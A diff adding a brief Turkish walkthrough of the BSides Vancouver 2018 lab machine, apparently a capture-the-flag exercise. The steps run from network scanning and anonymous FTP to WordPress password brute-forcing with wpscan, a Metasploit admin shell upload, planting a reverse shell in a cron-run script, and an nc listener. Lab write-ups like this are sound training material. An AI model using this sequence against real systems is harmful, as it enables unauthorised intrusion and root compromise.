@@ -1,0 +1,15 @@
+BSIDES VANCOUVER 2018 MAKİNE ÇÖZÜMÜ
+1 - arp-scan --localnet IP adresi 192.168.2.139 bulundu.
+2 - nmap -sT -A 192.168.2.139
+3 - ftp 192.168.2.139, cd public, get users.txt.bk
+4 - gobuster dir -u http://192.168.2.139 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+5 - http://192.168.2.139/robots.txt, /backup_wordpress
+6 - wpscan --url http://192.168.2.139/backup_wordpress -e u --usernames /home/alper/Downloads/users.txt.bk
+7 - wpscan --url http://192.168.2.139/backup_wordpress -e p --usernames john --passwords /usr/share/wordlists/rockyou.txt
+8 - msfconsole, search wp_admin, use exploit/unix/webapp/wp_admin_shell_upload
+9 - cat /etc/crontab, cat /usr/local/bin/cleanup
+10 - download /usr/local/bin/cleanup
+11 - dosyaya reverse shell ekle
+12 - upload cleanup /usr/local/bin/cleanup
+13 - nc -lvnp 4444
+14 - whoami
